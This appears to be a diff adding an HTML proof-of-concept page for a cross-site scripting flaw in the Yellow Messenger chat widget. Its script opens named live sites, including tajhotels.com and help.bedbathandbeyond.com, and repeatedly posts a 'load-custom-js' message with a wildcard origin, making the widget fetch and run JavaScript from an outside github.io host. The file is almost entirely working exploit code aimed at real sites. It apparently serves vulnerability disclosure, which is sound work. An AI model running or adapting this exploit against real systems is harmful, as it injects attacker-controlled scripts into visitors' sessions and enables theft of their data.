@@ -1,0 +1,32 @@
+<!doctype html>
+<html>
+   <head>
+      <meta charset="UTF-8" />
+      <title>Postmessage PoC</title>
+      <script>
+         function pocLink(url) {
+            let win1 = window.open(url);
+            var messageData1 = {event_code:"load-custom-js",data:{js:"https://ajmal8080rzp.github.io/cross.js",doNotdefer:false}}
+
+            setInterval(function() {
+               win1.postMessage(messageData1, '*');
+            }, 500);
+         }
+
+         setTimeout(function() {
+            pocLink('https://www.tajhotels.com/');
+         }, 500);
+      </script>
+   </head>
+   <body>
+      <h3> PoC Links - Click for the XSS to execute </h3>
+      <h4> Custom Sample page : </h4>
+      <a href="#" onclick="pocLink('https://sase12312.github.io/yellow_hosted_sample_page.html');">PoC link 0 | Custom Hosted sample page that uses Yellow Messenger </a>
+      <br/><br/>
+      <h4> Other pages that uses Yellow Messenger : </h4>
+      <br/><br/>
+      <a href="#" onclick="pocLink('https://www.tajhotels.com/');">PoC link 2 | tajhotels</a>    
+      <br/><br/>
+      <a href="#" onclick="pocLink('https://help.bedbathandbeyond.com/');">PoC link 2 | bedbathandbeyond</a>    
+   </body>
+</html>
